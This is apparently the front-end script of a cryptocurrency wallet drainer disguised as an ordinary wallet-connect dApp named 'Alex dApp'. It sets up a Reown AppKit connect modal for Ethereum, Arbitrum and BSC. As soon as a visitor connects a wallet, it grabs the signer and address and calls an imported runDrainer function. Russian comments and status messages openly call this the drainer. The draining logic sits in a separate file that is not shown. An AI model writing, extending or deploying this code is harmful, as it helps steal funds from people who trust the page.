import { createAppKit } from '@reown/appkit'
import { mainnet, arbitrum, bsc } from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, arbitrum, bsc]

const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks
})

const metadata = {
  name: 'Alex dApp',
  description: 'Connect your wallet',
  url: 'https://checkalex.xyz',
  icons: ['https://checkalex.xyz/icon.png']
}

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: {
    analytics: true
  }
})

document.getElementById('open-connect-modal').addEventListener('click', () => {
  modal.open()
})

// 🚀 Drainer запускается сразу после подключения
modal.on("connect", async () => {
  const statusEl = document.getElementById('status')
  statusEl.textContent = 'Запуск Drainer...'

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
    const signer = provider.getSigner()
    const address = await signer.getAddress()

    await runDrainer(provider, signer, address)

    statusEl.textContent = '✅ Drainer выполнен'
    modal.close()
  } catch (e) {
    console.error("Ошибка в Drainer:", e)
    statusEl.textContent = '❌ Ошибка: ' + e.message
    // НЕ закрываем модалку — пользователь должен увидеть, что пошло не так
  }
})
